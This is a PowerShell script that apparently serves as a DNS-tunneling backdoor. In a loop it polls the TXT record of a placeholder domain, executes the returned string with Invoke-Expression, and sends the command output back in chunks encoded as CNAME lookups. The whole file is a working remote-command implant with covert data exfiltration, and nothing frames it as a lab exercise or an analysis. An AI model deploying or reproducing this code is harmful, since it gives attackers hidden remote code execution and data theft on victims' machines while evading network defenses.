$domain = "Your_DomainName.co.il"

function Send-CnameQuery {
    param (
        [string]$data
    )
    try {
        nslookup -type=CNAME "$data.$domain"  | Out-Null
        Write-Output "Sent CNAME query: $data.$domain"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}

function Remove-Dots {
    param (
        [string]$data
    )
    return $data -replace '\.', ''
}

function Remove-ExtraSpaces {
    param (
        [string]$data
    )
    # Replace multiple spaces with a single underscore
    return $data -replace '\s+', '_'
}

function Process-CommandOutput {
    param (
        [string]$data
    )
    # Remove dots and replace extra spaces with underscores
    $data = Remove-Dots $data
    $data = Remove-ExtraSpaces $data
    # Trim leading and trailing spaces
    return $data.Trim()
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $command = $matches[1]
            Write-Output "Received command: $command"
            
            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $command 2>&1
            Write-Output "Raw Command output: $commandOutput"

            
            $commandOutput = Process-CommandOutput $commandOutput
            Write-Output "Processed Command output: $commandOutput"

            
            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $chunks = $commandOutput -split "(.{1,50})" | Where-Object { $_ -ne "" }
            $chunkCount = $chunks.Count

            
            nslookup -type=CNAME "$uniqueId-start.$domain"
            Start-Sleep -Milliseconds 400
            nslookup -type=CNAME "$chunkCount-chunks.$domain"
            Start-Sleep -Milliseconds 400

            $chunkIndex = 1
            foreach ($chunk in $chunks) {
                $chunk = "chunk$chunkIndex-$chunk"
               nslookup -type=CNAME "$chunk.$domain"
                Start-Sleep -Milliseconds 5000
                $chunkIndex++
            }

            nslookup -type=CNAME "$uniqueId-end.$domain"
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}
